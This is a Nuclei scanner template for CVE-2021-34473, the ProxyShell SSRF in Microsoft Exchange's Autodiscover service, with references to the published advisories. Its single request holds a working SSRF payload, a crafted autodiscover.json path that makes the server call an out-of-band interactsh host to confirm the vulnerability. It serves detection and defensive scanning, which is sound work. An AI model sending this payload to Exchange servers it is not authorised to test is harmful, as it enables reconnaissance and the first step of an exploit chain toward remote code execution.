id: CVE-2021-34473

info:
  name: Microsoft Exchange Server ProxyShell SSRF
  author: dwisiswant0
  severity: critical
  description: |
    The specific flaw exists within the Autodiscover service.
    The issue results from the lack of proper validation of URI prior to accessing resources.
    An attacker can leverage this in conjunction with other
    vulnerabilities to execute arbitrary code in the context of SYSTEM.
  reference: |
    - https://www.zerodayinitiative.com/advisories/ZDI-21-821/
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473
    - https://github.com/GossiTheDog/scanning/blob/main/http-vuln-exchange-proxyshell.nse
  tags: cve,cve2021,microsoft,proxyshell,ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/autodiscover/autodiscover.json?@{{interactsh-url}}/owa/?&Email=autodiscover/autodiscover.json%3F@{{interactsh-url}}"
    redirects: true
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"